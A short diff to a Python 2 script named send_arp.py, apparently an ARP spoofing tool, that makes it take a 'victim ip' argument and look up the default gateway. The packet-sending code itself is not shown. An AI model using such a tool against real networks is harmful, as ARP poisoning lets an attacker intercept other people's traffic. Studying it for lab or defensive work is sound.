@@ -1,3 +1,4 @@
+import sys
 import pcap
 import struct
 import netifaces
@@ -83,6 +84,8 @@ class ARP(object):
 
 
 def main():
+    if len(sys.argv) != 2:
+        print 'Usage: python send_arp.py <victim ip>'
     device_name = pcap.lookupdev()
     addresses = netifaces.ifaddresses(device_name)
 
@@ -92,8 +95,8 @@ def main():
     my_ip = addresses[netifaces.AF_INET][0]['addr']
     my_ip_bytes = ipaddress.ip_address(my_ip.decode('ascii')).packed
 
-    recipient_ip = netifaces.gateways()['default'][netifaces.AF_INET][1].decode('ascii')
-    victim_ip = raw_input('input victim_ip: ').decode('ascii')
+    recipient_ip = netifaces.gateways()['default'][netifaces.AF_INET][0].decode('ascii')
+    victim_ip = sys.argv[1].decode('ascii')
     print
 
     victim_ip_bytes = ipaddress.ip_address(victim_ip).packed
